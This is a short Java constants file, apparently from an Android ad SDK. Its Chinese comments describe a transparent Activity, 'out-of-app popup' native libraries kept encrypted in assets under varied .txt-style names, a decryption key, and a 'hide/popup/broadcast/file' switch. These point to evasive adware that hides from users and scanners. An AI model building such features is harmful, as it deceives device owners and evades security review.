package com.ak.impI;

/**
 * Date：2025/10/15
 * Describe:
 */
public class Constant {

    // todo 和So.txt 想对应
    // 透明Ac的SimpleName 注意取名需要唯一，不能与广告ac和普通ac名字重复
    public static String AC_NAME = "DemoTransparentActivity";

    //todo modify adImpressionName
    public static String FIRE_NAME = "ad_impression_xxx";

    // todo modify 外弹so 放在asset里面加密后的名称需要重命名格式差异化不要都是txt 64 和32
    public static String Fire_64 = "64.txt";
    public static String Fire_32 = "32.txt";

    // todo Modify H5 so名字 放在asset里面加密后的名称需要重命名格式差异化不要都是txt 64 和32

    public static String H_64 = "h64.txt";
    public static String H_32 = "h32.txt";


    // todo 解析json的 key
    public static String K_TIME = "time";
    public static String K_ID_L = "ad_id_h"; //广告ID 列表
    public static String K_SO = "so_key";  // So 解密的key
    public static String K_W = "wai_str";  // 隐藏/外弹/广播/文件开关 key
}
